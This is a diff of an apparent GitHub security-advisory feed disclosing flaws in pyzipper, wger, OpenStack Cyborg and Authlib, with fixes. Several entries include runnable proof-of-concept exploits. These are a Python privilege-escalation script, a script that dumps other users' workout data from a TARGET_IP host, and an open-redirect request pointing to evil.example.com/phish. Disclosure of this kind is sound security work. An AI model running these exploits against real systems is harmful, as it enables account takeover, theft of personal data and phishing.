+        <link href="https://github.com/advisories/GHSA-crqm-m339-7m2p"/>
+        <updated>2026-05-14T16:17:02.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>A Python operator precedence bug in pyzipper/zipfile_aes.py caused the AE-2 format to never be automatically selected during encryption, regardless of file size or compression type. As a result, all encrypted entries are written in AE-1 format unless AE-2 is explicitly forced by the caller. AE-1 stores the plaintext CRC32 checksum unencrypted in the ZIP header. During investigation of this issue, it was also found that when writing to an unseekable zip archive, the CRC32 value was always written to the datadescripter section.</p>
+<p>The AES encryption itself is not broken. An attacker who possesses the archive can read the CRC32 from the header without decrypting anything, then brute-force candidate plaintexts by computing CRC32(candidate) and comparing against the stored value. In practice, this attack is feasible today only against small or low-entropy files, as CRC32 exhaustion across a large plaintext space is computationally prohibitive on current hardware. Files with high-entropy or large content are not practically at risk under current computing constraints. Without this bug, pyzipper would have removed the CRC32 value for any file with content of less than 20 bytes uncompressed.</p>
+<h3 id="patches">Patches</h3>
+<p>Upgrade to pyzipper 0.4.0 that changes the default behaviour of pyzipper to always use the AE-2 format and exclude the CRC32 values, unless instructed to do otherwise.</p>
+<p>If rewriting the zip archive to remove the CRC values for small files, the entire zip archive should be recreated to avoid the original local file header with the CRC included remaining in the zip file in a detached state.</p>
+<h2 id="credit">Credit</h2>
+<p>Thanks to Lucas Lavarello from Kulkan Security for identifying this issue.</p>
+<h3 id="references">References</h3>
+<p><a href="https://www.winzip.com/en/support/aes-encryption/#CRC">https://www.winzip.com/en/support/aes-encryption/#CRC</a>
+<a href="https://www.winzip.com/en/support/aes-encryption/#crc-faq">https://www.winzip.com/en/support/aes-encryption/#crc-faq</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/danifus/pyzipper/security/advisories/GHSA-crqm-m339-7m2p">https://github.com/danifus/pyzipper/security/advisories/GHSA-crqm-m339-7m2p</a></li>
+<li><a href="https://github.com/danifus/pyzipper/releases/tag/v0.4.0">https://github.com/danifus/pyzipper/releases/tag/v0.4.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-crqm-m339-7m2p">https://github.com/advisories/GHSA-crqm-m339-7m2p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-crqm-m339-7m2p</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-14T16:17:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wger] wger: Privilege escalation via trainer-login session chaining allows gym trainer to impersonate gym manager]]></title>
+        <id>https://github.com/advisories/GHSA-9qpr-vc49-hqg2</id>
+        <link href="https://github.com/advisories/GHSA-9qpr-vc49-hqg2"/>
+        <updated>2026-05-14T16:16:31.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A gym trainer can escalate their session to any higher-privileged account (gym manager, general manager) by chaining two calls to the trainer-login endpoint. Once a trainer performs a legitimate switch into a low-privileged user, the session flag <code>trainer.identity</code>
+is set and this flag alone bypasses the permission check on all subsequent trainer-login calls, allowing the trainer to hop into any account including gym managers.</p>
+<h3 id="details">Details</h3>
+<p>In <code>wger/core/views/user.py</code> lines 169–178, the permission check uses an AND condition:</p>
+<pre><code class="language-python"># Line 169 — passes if EITHER condition is false
+if not request.user.has_perm('gym.gym_trainer') and not request.session.get('trainer.identity'):
+    return HttpResponseForbidden()
+
+# Line 173 — only runs when current user IS a trainer, not when identity is inherited
+if request.user.has_perm('gym.gym_trainer') and (
+    user.has_perm('gym.manage_gym') or user.has_perm('gym.manage_gyms')
+):
+    return HttpResponseForbidden()
+</code></pre>
+<p>After hop 1 (trainer → regular user), <code>request.user</code> is the regular user who has no <code>gym_trainer</code> permission, but <code>session['trainer.identity']</code> is set. Line 169 evaluates:
+<code>not False AND not False</code> → the second operand short-circuits the check. Line 173 is never reached because the current user is no longer a trainer. The attacker can therefore call trainer-login again targeting a manager account and it succeeds.</p>
+<h3 id="poc">PoC</h3>
+<p>Requirements: A running wger instance with at least one gym trainer account and one gym manager account in the same gym.</p>
+<pre><code class="language-python">import requests
+
+BASE = 'http://localhost:80'
+s = requests.Session()
+
+def whoami():
+    r = s.get(f'{BASE}/api/v2/userprofile/',
+              headers={'Accept': 'application/json'})
+    return r.json().get('username')
+
+# ─────────────────────────────────────────────
+print("=" * 55)
+print("  PoC: Trainer Login Privilege Escalation")
+print("  wger/core/views/user.py:169")
+print("=" * 55)
+
+# ─── STEP 1: Normal login as gym trainer ─────
+print("\n[STEP 1] Login as 'trainer1'")
+print("         trainer1 has ONLY 'gym.gym_trainer' permission")
+
+s.get(f'{BASE}/en/user/login')
+s.post(f'{BASE}/en/user/login', data={
+    'username': 'trainer1',
+    'password': 'pass1234',
+    'csrfmiddlewaretoken': s.cookies['csrftoken'],
+})
+print(f"         Current user  : {whoami()}")
+print(f"         Permission    : gym.gym_trainer (NOT manage_gym)")
+
+# ─── STEP 2: Legitimate trainer-login ────────
+print("\n[STEP 2] trainer1 uses trainer-login to switch into 'regular1' (pk=4)")
+print("         This is ALLOWED — trainer1 has gym_trainer permission")
+print("         Side effect: session['trainer.identity'] = trainer1_pk")
+
+s.get(f'{BASE}/en/user/4/trainer-login')
+print(f"         Current user  : {whoami()}")
+print(f"         Session flag  : trainer.identity is now SET")
+
+# ─── STEP 3: EXPLOIT ─────────────────────────
+print("\n[STEP 3] EXPLOIT — now as 'regular1', call trainer-login for 'manager1' (pk=3)")
+print("         regular1 has ZERO permissions")
+print("         BUT session['trainer.identity'] is set from Step 2")
+print("         Line 169 check: `not has_perm() AND not session.get()` → BYPASSED")
+
+s.get(f'{BASE}/en/user/3/trainer-login')
+result = whoami()
+print(f"         Current user  : {result}")
+
+# ─── RESULT ──────────────────────────────────
+print("\n" + "=" * 55)
+if result == 'manager1':
+    print("  RESULT : !! VULNERABLE !!")
+    print("  trainer1 (gym_trainer) is now logged in as manager1")
+    print("  manager1 has 'gym.manage_gym' — full gym admin access")
+else:
+    print("  RESULT : Not vulnerable (got: " + result + ")")
+print("=" * 55)
+</code></pre>
+<p>Output on wger 2.5.0a2:</p>
+<img src="https://github.com/user-attachments/assets/3e8affa3-4728-480c-bb57-929f66723ea5" alt="image" height="628" width="728">
+
+<h3 id="impact">Impact</h3>
+<p>Any authenticated gym trainer can take over a gym manager or general gym manager account within the same gym. This grants full gym administration capabilities including viewing all member data, modifying contracts, managing gym configuration, and accessing other trainers' and managers' personal information.</p>
+<h3 id="how-to-fix">How to fix</h3>
+<p>The root cause is a logical error in wger/core/views/user.py at line 169. The AND operator means that if session['trainer.identity'] is set, the entire permission check is skipped — allowing any user who has previously been switched into to perform further trainer-login hops without holding the gym.gym_trainer permission themselves. Additionally, the target-user protection block at line 173 only executes when request.user is a trainer, so it never fires during a chained hop.</p>
+<p>Vulnerable code (user.py:169–178):</p>
+<pre><code>if not request.user.has_perm('gym.gym_trainer') and not request.session.get('trainer.identity'):
+    return HttpResponseForbidden()
+
+if request.user.has_perm('gym.gym_trainer') and (
+    user.has_perm('gym.gym_trainer')
+    or user.has_perm('gym.manage_gym')
+    or user.has_perm('gym.manage_gyms')
+):
+    return HttpResponseForbidden()
+</code></pre>
+<p>Suggested fix:</p>
+<pre><code>trainer_identity_pk = request.session.get('trainer.identity')
+
+if not request.user.has_perm('gym.gym_trainer'):
+    if not trainer_identity_pk:
+        return HttpResponseForbidden()
+    # Verify the original trainer in the session still holds the permission
+    original_trainer = get_object_or_404(User, pk=trainer_identity_pk)
+    if not original_trainer.has_perm('gym.gym_trainer'):
+        return HttpResponseForbidden()
+
+# Target-user check must apply in both direct and chained hop scenarios
+if (request.user.has_perm('gym.gym_trainer') or trainer_identity_pk) and (
+    user.has_perm('gym.gym_trainer')
+    or user.has_perm('gym.manage_gym')
+    or user.has_perm('gym.manage_gyms')
+):
+    return HttpResponseForbidden()
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/wger-project/wger/security/advisories/GHSA-9qpr-vc49-hqg2">https://github.com/wger-project/wger/security/advisories/GHSA-9qpr-vc49-hqg2</a></li>
+<li><a href="https://github.com/advisories/GHSA-9qpr-vc49-hqg2">https://github.com/advisories/GHSA-9qpr-vc49-hqg2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9qpr-vc49-hqg2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-14T16:16:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wger] wger Vulnerable to IDOR: Authenticated Users Can Read Any User's Private Workout Session Data via Template Routine API]]></title>
+        <id>https://github.com/advisories/GHSA-cj9g-27ph-4cgv</id>
+        <link href="https://github.com/advisories/GHSA-cj9g-27ph-4cgv"/>
+        <updated>2026-05-14T16:16:25.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Any authenticated user can read another user's private workout session notes, exercise history, and training statistics by calling the /logs/ and /stats/ actions on a routine they do not own.</p>
+<p>The RoutinePermission class grants read access to any authenticated user when a routine has is_template=True, regardless of ownership. The /logs/ and /stats/ API actions use the same permission check but return the routine owner's personal training data instead of the requesting user's data, creating an insecure direct object reference (IDOR).</p>
+<p>An attacker with a free account can enumerate all public template routine IDs via GET /api/v2/routine/?is_template=true, then call 
+GET /api/v2/routine/{id}/logs/ and GET /api/v2/routine/{id}/stats/ to access the owner's private health data including workout notes, weights, repetitions, and performance statistics.</p>
+<h3 id="description">Description</h3>
+<p>wger exposes a REST API endpoint that allows any authenticated user to retrieve the <strong>private workout session notes, exercise logs, and training statistics</strong> belonging to another user, as long as that user has at least one routine marked as a public template.</p>
+<p>The vulnerability exists in <code>RoutineViewSet</code> (<code>wger/manager/api/views.py</code>). The view defines two custom actions  <code>/logs/</code> and <code>/stats/</code>  that are intended to return data for the <strong>requesting user's own</strong> training history within a routine. However, the underlying permission check (<code>RoutinePermission.has_object_permission</code>) grants read access to <strong>any</strong> authenticated user when the routine has <code>is_template=True</code>, regardless of ownership. When the <code>/logs/</code> or <code>/stats/</code> actions are invoked against a routine the attacker does not own, they return the <strong>owner's</strong> private workout history, not the attacker's.</p>
+<h3 id="root-cause">Root Cause</h3>
+<p><strong>File:</strong> <code>wger/manager/api/permissions.py</code>, lines 30–41</p>
+<pre><code class="language-python">def has_object_permission(self, request, view, obj):
+    if obj.user == request.user:
+        return True
+
+    if obj.is_template:                                  # ← any template is readable
+        return request.method in permissions.SAFE_METHODS  # by any authenticated user
+
+    return False
+</code></pre>
+<p><strong>File:</strong> <code>wger/manager/api/views.py</code>, lines 173–199</p>
+<pre><code class="language-python">@action(detail=True, url_path='logs')
+def logs(self, request, pk):
+    out = LogDisplaySerializer(
+        self.get_object().logs_display(),   # ← returns OWNER's logs, not request.user's
+        many=True,
+    ).data
+    return Response(out)
+
+@action(detail=True, url_path='stats')
+def stats(self, request, pk):
+    out = LogStatsDataSerializer(
+        self.get_object().calculate_log_statistics()  # ← owner's statistics
+    ).data
+    return Response(out)
+</code></pre>
+<p><code>self.get_object()</code> retrieves the routine belonging to the <strong>owner</strong> (e.g., user A). Since <code>is_template=True</code> passes the permission check for any authenticated user, the attacker's request reaches <code>logs_display()</code> and <code>calculate_log_statistics()</code>, which return the <strong>owner's</strong> workout history, not the attacker's.</p>
+<p>The intended behavior is that templates are public workout <em>plans</em> (exercise structure, sets, reps), but the <code>/logs/</code> and <code>/stats/</code> actions expose the <em>owner's personal training history</em> logged against that plan.</p>
+<h3 id="impact">Impact</h3>
+<p>An authenticated attacker can:</p>
+<ol>
+<li><p><strong>Enumerate</strong> all public template routines across all users:
+<code>GET /api/v2/routine/?is_template=true&amp;is_public=true</code></p>
+</li>
+<li><p><strong>Read private workout session notes</strong> (freeform text entered by the victim after each workout session)</p>
+</li>
+<li><p><strong>Read full workout history</strong> including exercise names, weights, repetitions, and dates</p>
+</li>
+<li><p><strong>Read training statistics</strong> including volume, intensity, and set counts per muscle group and mesocycle</p>
+</li>
+</ol>
+<p>This data is health-related and personal. Under GDPR and similar regulations, unauthorized access to personal health data constitutes a data breach.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<h4 id="scenario">Scenario</h4>
+<p>There are two users in the system:</p>
+<ul>
+<li><p><strong>alice</strong> : a regular wger user who has been using the platform for months. She created a routine called "My 5/3/1 Program" and marked it as a public template so others can copy her exercise structure. She logs all her workouts with personal notes after each session.</p>
+</li>
+<li><p><strong>bob</strong> :  a second registered user who has never interacted with alice's account.</p>
+</li>
+</ul>
+<p><strong>The attack:</strong></p>
+<p>Bob calls the routine listing endpoint to find all public templates. He gets back alice's routine ID. He then calls <code>/api/v2/routine/{id}/logs/</code>  an endpoint that should only show his own logs but instead receives alice's full workout history, including all her session notes ("Felt strong today, PR on squat"), weights, and performance data.</p>
+<p>Bob does <strong>not</strong> need to know alice's username. He only needs her routine ID, which is a sequential integer discoverable by iterating <code>?is_template=true</code>.</p>
+<h4 id="step-by-step">Step-by-step</h4>
+<ol>
+<li><p>Bob registers a free account on the wger instance and obtains a JWT access token via <code>POST /api/v2/token</code>.</p>
+</li>
+<li><p>Bob calls <code>GET /api/v2/routine/?is_template=true&amp;is_public=true</code> this lists all public template routines from <strong>all users</strong> across the platform, including their IDs.</p>
+</li>
+<li><p>For each routine ID returned, Bob calls <code>GET /api/v2/routine/{id}/logs/</code>  this returns the <strong>routine owner's</strong> workout sessions, including freeform personal notes and all logged exercises with weights and reps.</p>
+</li>
+<li><p>Bob calls <code>GET /api/v2/routine/{id}/stats/</code> to get aggregated statistics (total volume, intensity by muscle group, weekly progression) for the routine's owner.</p>
+</li>
+</ol>
+<p>No special permissions are needed. A fresh account (1-minute-old) can exploit this.</p>
+<h4 id="python-poc">Python PoC</h4>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+PoC: IDOR - Workout Session Data Exposure via Template Routine API
+Affected: wger &lt;= 2.5.0a2
+Target:   GET /api/v2/routine/{id}/logs/
+          GET /api/v2/routine/{id}/stats/
+"""
+
+import requests
+import json
+
+BASE_URL = "http://TARGET_IP"  # replace with target
+
+
+def get_token(username, password):
+    r = requests.post(
+        f"{BASE_URL}/api/v2/token",
+        json={"username": username, "password": password},
+    )
+    r.raise_for_status()
+    return r.json()["access"]
+
+
+def exploit(attacker_token):
+    headers = {"Authorization": f"Bearer {attacker_token}"}
+
+    # Step 1: Enumerate all public template routines (from ALL users)
+    print("[*] Step 1: Enumerating public template routines...")
+    r = requests.get(
+        f"{BASE_URL}/api/v2/routine/",
+        params={"is_template": "true", "is_public": "true"},
+        headers=headers,
+    )
+    routines = r.json().get("results", [])
+    print(f"[+] Found {len(routines)} public template routine(s)\n")
+
+    for routine in routines:
+        routine_id = routine["id"]
+        routine_name = routine["name"]
+        print(f"[*] Targeting routine #{routine_id}: '{routine_name}'")
+
+        # Step 2: Fetch the OWNER's workout session logs (IDOR)
+        logs_r = requests.get(
+            f"{BASE_URL}/api/v2/routine/{routine_id}/logs/",
+            headers=headers,
+        )
+
+        if logs_r.status_code == 200:
+            sessions = logs_r.json()
+            print(f"[+] VULNERABLE! Got {len(sessions)} session(s):")
+            for session in sessions:
+                s = session.get("session", {})
+                print(f"    Date:       {s.get('date')}")
+                print(f"    Notes:      {s.get('notes')}")   # ← private user notes
+                print(f"    Impression: {s.get('impression')}")
+                print(f"    Logs:       {len(session.get('logs', []))} exercise entries")
+                print()
+
+        # Step 3: Fetch the OWNER's training statistics (IDOR)
+        stats_r = requests.get(
+            f"{BASE_URL}/api/v2/routine/{routine_id}/stats/",
+            headers=headers,
+        )
+
+        if stats_r.status_code == 200:
+            stats = stats_r.json()
+            print(f"[+] Training statistics for routine #{routine_id}:")
+            volume = stats.get("volume", {}).get("mesocycle", {})
+            print(f"    Total volume:      {volume.get('total')} kg")
+            print(f"    Upper body volume: {volume.get('upper_body')} kg")
+            print(f"    Lower body volume: {volume.get('lower_body')} kg")
+            print()
+
+        print("-" * 60)
+
+
+if __name__ == "__main__":
+    # Attacker uses their OWN credentials (no privilege needed)
+    print("[*] Authenticating as attacker (bob)...")
+    token = get_token("bob", "bobpassword")
+    print(f"[+] Token acquired\n")
+
+    exploit(token)
+</code></pre>
+<h4 id="expected-output">Expected output</h4>
+<pre><code>[*] Authenticating as attacker (bob)...
+[+] Token acquired
+
+[*] Step 1: Enumerating public template routines...
+[+] Found 1 public template routine(s)
+
+[*] Targeting routine #1: 'Admin Secret Routine'
+[+] VULNERABLE! Got 1 session(s):
+    Date:       2024-06-15
+    Notes:      SECRET workout note      ← alice's private note
+    Impression: 3
+    Logs:       0 exercise entries
+
+[+] Training statistics for routine #1:
+    Total volume:      0.00 kg
+    Upper body volume: 0.00 kg
+    Lower body volume: 0.00 kg
+</code></pre>
+<img src="https://github.com/user-attachments/assets/473cfd87-a63a-452d-a4f3-1aad23c4be24" alt="image" height="594" width="671">
+
+
+<h3 id="recommended-fix">Recommended Fix</h3>
+<p>The <code>/logs/</code> and <code>/stats/</code> actions must filter results to the <strong>requesting user</strong>, not the routine owner.</p>
+<pre><code class="language-python"># wger/manager/api/views.py
+
+@action(detail=True, url_path='logs')
+def logs(self, request, pk):
+    routine = self.get_object()
+    # Only return logs for the requesting user, regardless of routine ownership
+    out = LogDisplaySerializer(
+        routine.logs_display(user=request.user),
+        many=True,
+    ).data
+    return Response(out)
+
+@action(detail=True, url_path='stats')
+def stats(self, request, pk):
+    routine = self.get_object()
+    out = LogStatsDataSerializer(
+        routine.calculate_log_statistics(user=request.user)
+    ).data
+    return Response(out)
+</code></pre>
+<p>Additionally, <code>RoutinePermission.has_object_permission</code> should explicitly deny access to the <code>/logs/</code> and <code>/stats/</code> actions for non-owners, regardless of <code>is_template</code>:</p>
+<pre><code class="language-python">def has_object_permission(self, request, view, obj):
+    if obj.user == request.user:
+        return True
+
+    # Template routines are readable, but only their structure 
+    # never their owner's personal training history
+    if obj.is_template and view.action not in ('logs', 'stats'):
+        return request.method in permissions.SAFE_METHODS
+
+    return False
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/wger-project/wger/security/advisories/GHSA-cj9g-27ph-4cgv">https://github.com/wger-project/wger/security/advisories/GHSA-cj9g-27ph-4cgv</a></li>
+<li><a href="https://github.com/advisories/GHSA-cj9g-27ph-4cgv">https://github.com/advisories/GHSA-cj9g-27ph-4cgv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cj9g-27ph-4cgv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-14T16:16:21.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[wger] wger has an Uncontrolled Resource Consumption issue]]></title>
         <id>https://github.com/advisories/GHSA-v25j-wqcw-fvhj</id>
@@ -879,419 +1813,5 @@ Applications are exposed when all of the following are true:</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-05-08T00:31:34.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openstack-cyborg] OpenStack Cyborg uses rule:allow (check_str='@') as the default policy for multiple API endpoints]]></title>
-        <id>https://github.com/advisories/GHSA-mm7j-mhhj-hj36</id>
-        <link href="https://github.com/advisories/GHSA-mm7j-mhhj-hj36"/>
-        <updated>2026-05-13T01:37:15.000Z</updated>
-        <content type="html"><![CDATA[<p>OpenStack Cyborg before 16.0.1 uses rule:allow (check_str='@') as the default policy for multiple API endpoints. This unconditionally authorizes any request carrying a valid Keystone token regardless of roles, project membership, or scope. An authenticated user with zero role assignments can complete various actions such as reprogramming FPGA bitstreams on arbitrary compute nodes via agent RPC.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40213">https://nvd.nist.gov/vuln/detail/CVE-2026-40213</a></li>
-<li><a href="https://bugs.launchpad.net/openstack-cyborg/+bug/2143263">https://bugs.launchpad.net/openstack-cyborg/+bug/2143263</a></li>
-<li><a href="https://www.openwall.com/lists/oss-security/2026/05/07/6">https://www.openwall.com/lists/oss-security/2026/05/07/6</a></li>
-<li><a href="https://security.openstack.org/ossa/OSSA-2026-011.html">https://security.openstack.org/ossa/OSSA-2026-011.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-mm7j-mhhj-hj36">https://github.com/advisories/GHSA-mm7j-mhhj-hj36</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mm7j-mhhj-hj36</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-08T00:31:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[authlib] Authlib OIDC Implicit/Hybrid Authorization Vulnerable to Open Redirect]]></title>
-        <id>https://github.com/advisories/GHSA-r95x-qfjj-fjj2</id>
-        <link href="https://github.com/advisories/GHSA-r95x-qfjj-fjj2"/>
-        <updated>2026-05-13T01:36:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An unauthenticated open redirect in Authlib's <code>OpenIDImplicitGrant</code> and <code>OpenIDHybridGrant</code> authorization endpoint lets a remote attacker cause the authorization server to issue an HTTP 302 to an attacker-chosen URL by submitting an authorization request that omits the <code>openid</code> scope.</p>
-<h3 id="details">Details</h3>
-<h4 id="vulnerable-code">Vulnerable code</h4>
-<p><code>OpenIDImplicitGrant.validate_authorization_request</code> in <code>authlib/oidc/core/grants/implicit.py</code>:</p>
-<pre><code class="language-python">def validate_authorization_request(self):
-    if not is_openid_scope(self.request.payload.scope):
-        raise InvalidScopeError(
-            "Missing 'openid' scope",
-            redirect_uri=self.request.payload.redirect_uri,  # ← raw, unvalidated
-            redirect_fragment=True,
-        )
-    redirect_uri = super().validate_authorization_request()
-    ...
-</code></pre>
-<p><code>OpenIDHybridGrant.validate_authorization_request</code> in <code>authlib/oidc/core/grants/hybrid.py</code> shares the same pattern.</p>
-<h4 id="root-cause">Root cause</h4>
-<p>Both methods perform the <code>openid</code> scope presence check before delegating to <code>super().validate_authorization_request()</code>, which is where <code>AuthorizationEndpointMixin.validate_authorization_redirect_uri</code> validates the requested <code>redirect_uri</code> against the client's <code>check_redirect_uri(...)</code>. The <code>InvalidScopeError</code> thrown by the scope check therefore carries attacker-controlled <code>self.request.payload.redirect_uri</code>.</p>
-<p><code>OAuth2Error.__call__</code> in <code>authlib/oauth2/base.py</code> renders any error with a non-empty <code>redirect_uri</code> as an HTTP 302:</p>
-<pre><code class="language-python">def __call__(self, uri=None):
-    if self.redirect_uri:
-        params = self.get_body()
-        loc = add_params_to_uri(self.redirect_uri, params, self.redirect_fragment)
-        return 302, "", [("Location", loc)]
-    return super().__call__(uri=uri)
-</code></pre>
-<p>A malformed authorization request that selects <code>OpenIDImplicitGrant</code> or <code>OpenIDHybridGrant</code> and omits the <code>openid</code> scope is therefore redirected to a fully attacker-chosen URL.</p>
-<p>This is a variant of the issue fixed in commit <a href="https://github.com/authlib/authlib/commit/3be08468"><code>3be08468</code></a> ("fix: redirecting to unvalidated <code>redirect_uri</code> on <code>UnsupportedResponseTypeError</code>") that was missed in the OIDC Implicit and Hybrid grants.</p>
-<h4 id="preconditions">Preconditions</h4>
-<ol>
-<li>The server registers <code>OpenIDImplicitGrant</code> or <code>OpenIDHybridGrant</code> (standard OIDC Implicit or Hybrid flow support).</li>
-<li>The attacker's request uses a <code>response_type</code> that matches either grant: <code>id_token</code>, <code>id_token token</code>, <code>code id_token</code>, <code>code token</code>, or <code>code id_token token</code>.</li>
-<li><code>scope</code> does not contain <code>openid</code>.</li>
-<li>Any <code>redirect_uri</code> value.</li>
-</ol>
-<p>No user authentication, no consent, no valid session, no CSRF token, and — notably — no valid <code>client_id</code> are required. The scope check runs before any client lookup, so any <code>client_id</code> value (including nonexistent ones) reaches the vulnerable code path.</p>
-<h3 id="poc">PoC</h3>
-<p>The following unauthenticated GET is sufficient to induce the authorization server to redirect a victim's browser to an attacker-controlled URL:</p>
-<pre><code>GET /oauth/authorize
-    ?response_type=id_token
-    &amp;client_id=anything
-    &amp;scope=profile
-    &amp;redirect_uri=https%3A%2F%2Fevil.example.com%2Fphish
-    &amp;state=s&amp;nonce=n  HTTP/1.1
-Host: victim-op.example
-</code></pre>
-<p>Server response:</p>
-<pre><code>HTTP/1.1 302 Found
-Location: https://evil.example.com/phish#error=invalid_scope&amp;error_description=Missing+%27openid%27+scope&amp;state=s
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Open redirect from a trusted authorization server origin. Victims receiving a phishing link see the legitimate OIDC provider's domain in the URL bar at the moment they click. The authorization server itself issues the 302 to the attacker's page, lending the attacker's landing page the OP's reputation and potentially satisfying domain-allow-list controls that trust the OP.</li>
-<li>Phishing / credential harvesting leverage. The attacker's page can mimic the legitimate OP's consent screen or a relying-party error page to solicit credentials, MFA codes, or to continue a downstream confused-deputy attack.</li>
-<li>RFC violation. RFC 6749 §4.1.2.1 and RFC 9700 (OAuth 2.0 Security BCP) §4.11 both state that an authorization server MUST NOT perform redirection to a <code>redirect_uri</code> that has not been validated against the client's registered URIs, even in error responses. The <code>state</code> parameter is echoed back, giving the attacker site a stable correlator.</li>
-<li>No direct token/code leak. This flaw fires before any authorization decision, so no authorization codes, ID tokens, or access tokens are disclosed. The impact is limited to open-redirect phishing leverage. Combined with other issues (e.g., downstream SSO trust chains) it may contribute to account-takeover chains; on its own it is a Medium-severity open redirect.</li>
-</ul>
-<h4 id="affected-deployments">Affected deployments</h4>
-<p>Any application using Authlib as an OIDC provider that registers <code>OpenIDImplicitGrant</code> and/or <code>OpenIDHybridGrant</code> — i.e. anyone supporting the Implicit flow or the Hybrid flow (<code>response_type=code id_token</code>, etc.) — is affected. Clients of an Authlib-based OP are not directly affected; this is a server-side issue.</p>
-<p>Authorization servers that only register the plain <code>AuthorizationCodeGrant</code> (code flow, with or without PKCE and the <code>OpenIDCode</code> extension) are not affected by this specific variant: the code-flow grant validates <code>redirect_uri</code> before raising scope errors. If you were affected by the sibling issue fixed in <code>3be08468</code> (<code>UnsupportedResponseTypeError</code>), you should already be on <code>1.6.10</code> or later; this advisory is independent of that fix.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>The attached <code>fix-oidc-open-redirect.patch</code> reorders each method to delegate to its super (or call <code>validate_code_authorization_request</code> for Hybrid) first, and then performs the <code>openid</code>-scope check with the validated <code>redirect_uri</code> variable.</p>
-<pre><code class="language-python"># authlib/oidc/core/grants/implicit.py
-def validate_authorization_request(self):
-    redirect_uri = super().validate_authorization_request()   # runs client + redirect_uri validation
-    if not is_openid_scope(self.request.payload.scope):
-        raise InvalidScopeError(
-            "Missing 'openid' scope",
-            redirect_uri=redirect_uri,                         # validated
-            redirect_fragment=True,
-        )
-    try:
-        validate_nonce(self.request, self.exists_nonce, required=True)
-    except OAuth2Error as error:
-        error.redirect_uri = redirect_uri
-        error.redirect_fragment = True
-        raise error
-    return redirect_uri
-</code></pre>
-<p>An equivalent transform is applied to <code>OpenIDHybridGrant.validate_authorization_request</code>, invoking <code>validate_code_authorization_request</code> first and only then checking <code>is_openid_scope</code>.</p>
-<p>Alternatively, inline a <code>client = query_client(request.payload.client_id)</code> + <code>client.check_redirect_uri(request.payload.redirect_uri)</code> guard before populating <code>redirect_uri</code> on the error — the pattern used in <code>3be08468</code>.</p>
-<p>The patch also adds regression tests analogous to <code>test_unsupported_response_type_does_not_redirect</code> from commit <code>3be08468</code>, asserting <code>rv.status_code == 400</code> and <code>rv.headers.get("Location") is None</code> for an unregistered <code>redirect_uri</code> with a non-<code>openid</code> scope.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>No clean server-side workaround exists short of patching. Partial mitigations:</p>
-<ul>
-<li>Unregister <code>OpenIDImplicitGrant</code> and <code>OpenIDHybridGrant</code> if the Implicit and Hybrid flows are not required. (RFC 9700 deprecates the Implicit flow and discourages Hybrid flows, so this is recommended anyway.)</li>
-<li>Front the <code>/authorize</code> endpoint with a reverse proxy rule that rejects requests containing both a <code>redirect_uri</code> parameter and a <code>scope</code> that does not include <code>openid</code> when <code>response_type</code> matches the vulnerable set. This is fragile and not recommended as a primary control.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li>RFC 6749, §4.1.2.1 — Error Response (OAuth 2.0 authorization endpoint)</li>
-<li>RFC 9700, §4.11 — Redirect URI validation</li>
-<li>OpenID Connect Core 1.0, §3.2.2.6 / §3.3.2.6 — Authentication Error Response</li>
-<li>Authlib commit <a href="https://github.com/authlib/authlib/commit/3be08468"><code>3be08468</code></a> — prior fix for the same class of issue in <code>UnsupportedResponseTypeError</code> (Authlib 1.6.10)</li>
-<li>Authlib source (by symbol; verified in commit <code>5d2e603e</code>):<ul>
-<li><code>OpenIDImplicitGrant.validate_authorization_request</code> — <code>authlib/oidc/core/grants/implicit.py</code></li>
-<li><code>OpenIDHybridGrant.validate_authorization_request</code> — <code>authlib/oidc/core/grants/hybrid.py</code></li>
-<li><code>OAuth2Error.__call__</code> — <code>authlib/oauth2/base.py</code> (renders errors with <code>redirect_uri</code> as HTTP 302)</li>
-<li><code>AuthorizationEndpointMixin.validate_authorization_redirect_uri</code> — <code>authlib/oauth2/rfc6749/grants/base.py</code> (the validation that is bypassed)</li>
-</ul>
-</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
